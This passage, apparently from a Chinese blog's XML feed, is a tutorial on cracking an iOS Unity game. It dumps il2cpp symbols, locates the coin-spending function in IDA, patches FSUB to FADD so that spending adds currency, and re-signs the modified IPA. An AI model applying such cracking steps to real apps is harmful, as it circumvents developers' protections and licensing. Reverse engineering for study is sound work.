src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnSVoilDB8tTBfvFls9MAnvb.png"></p><p>反编译后的数据信息</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnEYnzNfzvqp6n1wPbWL1mYf.png"></p><p>其中 stringliteral.json 是字符串表信息，包含着游戏字符串和对应偏移地址，il2cpp.h 是 object-c 的结构体信息</p><p>dump.cs 是.net 反编译后的源码信息，DummyDll 中包含的是提取出来的所有游戏 DLL 信息与 dump.cs 内容一致。</p><h3 id="逆向分析主程序"><a href="#逆向分析主程序" class="headerlink" title="逆向分析主程序"></a>逆向分析主程序</h3><p>首先通过 ida 打开程序</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcniqSbnOWZcULEuB3k3HwGeg.png"></p><p>接着利用脚本导入之前得到的 il2cpp.h 文件，和字符串文件信息</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnoXIzcO49IjqQ8GIovJC9qh.png"></p><p>这几个都可以导入，等待 20-30 分钟（函数量非常大！！）</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcndmfo2D6CT5zJ6psKdIOfMg.png"></p><p>接着就能看到 字符串已经可以分析出来了，函数名称也已经恢复，接着通过字符串文件，搜索我们的需求 `<strong>钱！！！！</strong></p><p>通过关键字 <code>money</code> 、<code>coin</code> 搜索到一个关键信息</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnSEqS3Y2DVAz35ebdDAKWfh.png"></p><p>ida 中输入 g，复制地址跳转</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcntjU2nDRNbOY7PzxaZQTG7d.png"></p><p>发现有几个函数引用了该字符串，get_GameCoin、set_GameCoin，因为目的是要改钱，所以 set 对我们更重要</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn2Kno7Ua0UpgaVKRcbDnwjc.png"></p><p>根据 value 进行设置，看看哪里用了 set</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnAyS6owBybEtXazcymb3QBh.png"></p><p>发现有 CostCoin 函数和 AddCoin 函数都用到了该函数，所以这里有两种改法，一个是修改 AddCoin 时设置钱的数量，一个是修改花费时不扣钱。</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnKkHB5rmPAMzZB5mVkiGJvg.png"></p><p>可以看到增加钱的逻辑，是查询现有的钱然后加上获得的钱，这里修改的话就会造成一个问题！！！初始化的时候钱为 0.不太好改动，所以我打算改动了花费处</p><p><img src="/sboxcnPkalcvB4EGjGtobm8QO1Lg.png"></p><p>可以看到，我把花费时应该-coin 的位置改成了 +coin，这样的话每次花钱都会价钱，达到了一个修改金钱的目的</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnHQ0fZiEBkztENJWLUvNRpd.png"></p><p>改法比较简单，把原本 FSUB 改成 FADD 就可以了，除了钱还有个新出的模式 月球模式</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnMw4S8i3IwH7yPhVMPaKXie.png"></p><p>这个也是一种钞票，我们用同样的方式进行逆向</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnHHYqNfT6fSCBfILVSgOkue.png"></p><p>又看到熟悉的 ADD 和 Cost，同样减改成加</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcngxewsshIQZWUU7WVuc2bre.png"></p><p>改法相同 FSUB 改成 FADD</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnOqTyizqMdPAhYZDUwHZZtf.png"></p><h2 id="打包重签名"><a href="#打包重签名" class="headerlink" title="打包重签名"></a>打包重签名</h2><p>这个过程方法有太多太多，这里为了能尽快玩上游戏，我们就走最朴实无华的路线。</p><p>首先将 patched 后的游戏文件替换掉原本的文件</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn85zIE4jPqwOQpFs34t50vc.png"></p><p>把该文件复制到对应位置，并且进入这个位置，右键压缩文件</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn4va9IAGB96jX3K2ALaCv4d.png"></p><p>压缩后，重命名 Payload.zip 为 Payload.ipa</p><p>打开爱思助手！！！，使用里面的签名工具</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcniyY5OAGkwqvNpc8dQirz7c.png"></p><p>签名完成后，就能安装使用了</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn468hrv1wyvIDPVhopTFDBd.png"></p><p>安装即可</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnmoH9OE4T9C8bGEJGfmlC7g.png"></p><h2 id="成功截图"><a href="#成功截图" class="headerlink" title="成功截图"></a>成功截图</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;游戏介绍&quot;&gt;&lt;a href=&quot;#游戏介绍&quot; class=&quot;headerlink&quot; title=&quot;游戏介绍&quot;&gt;&lt;/a&gt;游戏介绍&lt;/h2&gt;&lt;p&gt;版本：1.2.4&lt;br&gt;设备：xsmax&lt;br&gt;游戏环境：Unity&lt;/p&gt;</summary>
    
    
    
    <category term="逆向工程" scheme="http://ioo0s.art/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
    <category term="ios逆向" scheme="http://ioo0s.art/tags/ios%E9%80%86%E5%90%91/"/>
    
    <category term="游戏破解" scheme="http://ioo0s.art/tags/%E6%B8%B8%E6%88%8F%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
